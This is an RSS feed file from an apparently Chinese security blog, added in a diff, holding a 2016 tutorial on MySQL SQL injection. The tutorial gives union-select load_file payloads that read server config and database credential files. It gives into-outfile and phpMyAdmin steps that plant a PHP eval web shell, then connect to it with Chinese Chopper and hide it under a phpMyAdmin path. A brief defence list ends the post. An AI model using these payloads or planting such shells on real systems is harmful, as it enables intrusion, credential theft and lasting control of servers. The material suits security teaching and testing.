@@ -1,0 +1,138 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Load_file on </title>
+    <link>http://wyb0.com/tags/load_file/</link>
+    <description>Recent content in Load_file on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Mon, 20 Jun 2016 08:10:27 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/tags/load_file/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SQL注入之MySQL函数利用</title>
+      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMySQL%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMySQL%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-load-file:53f87bd794196d15add1cc0ee5d9d5f8&#34;&gt;0x00 load_file()&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;条件:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;1. 要有file_priv权限
+2. 知道文件绝对路径
+3. 能使用union
+4. 对web目录有读权限  
+注：若过滤了单引号，则可以将函数中的字符进行hex编码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;一般步骤&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;读/etc/init.d下的东西，这里有配置文件路径&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;得到web安装路径&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;读取密码文件&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x01-into-outfile:53f87bd794196d15add1cc0ee5d9d5f8&#34;&gt;0x01 into outfile&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;条件：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;1. 要有file_priv权限  
+2. 知道网站绝对路径  
+3. 要能用union  
+4. 对web目录有写权限  
+5. 没有过滤单引号
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;一般方法&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;当知道路径时，可以直接用?id=1 union select &amp;ldquo;&amp;lt;?php @eval($_POST[&amp;lsquo;c&amp;rsquo;]);?&amp;gt;&amp;rdquo; into outfile(&amp;ldquo;C:/phpStudy/WWW/a.php&amp;rdquo;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;其他方法&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;登陆phpMyAdmin&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;use test;  选择数据库为test
+create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
+insert into aaa values(&amp;quot;&amp;lt;?php @eval($_POST[&#39;c&#39;]);?&amp;gt;&amp;quot;);   在aaa中插入一条数据&amp;lt;?php @eval($_POST[&#39;c&#39;]);?&amp;gt;
+select * from aaa into outfile &#39;C:/phpStudy/WWW/a.php&#39;;  将aaa中的数据导出到文件a.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;localhost:80/a.php能访问&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;drop aaa;  //删除建立的表
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;然后菜刀连接&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;1. 菜刀连接：  
+    C:\phpStudy\WWW\a.php
+2. 更改shell的名字并将shell放在较隐蔽的地方：  
+    C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x02-防御:53f87bd794196d15add1cc0ee5d9d5f8&#34;&gt;0x02 防御&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;数据库连接账号不要用root权限&lt;/li&gt;
+&lt;li&gt;php关闭报错模式&lt;/li&gt;
+&lt;li&gt;mysql账户没有权限向网站目录写文件&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
